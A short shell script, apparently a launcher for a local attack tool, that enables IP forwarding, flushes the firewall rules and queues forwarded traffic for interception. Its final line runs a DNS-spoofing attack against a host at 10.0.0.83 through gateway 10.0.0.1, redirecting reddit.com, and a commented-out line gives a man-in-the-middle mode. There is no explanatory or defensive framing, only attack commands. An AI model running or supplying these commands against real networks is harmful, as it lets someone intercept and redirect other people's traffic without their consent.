sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables --flush

sudo iptables -I FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu

#sudo -E ./exec.sh mitm --target 10.0.0.83 --gateway 10.0.0.1 --interface eth0
sudo -E ./exec.sh dns_spoof --target 10.0.0.83 --gateway 10.0.0.1 --interface eth0 --domain reddit.com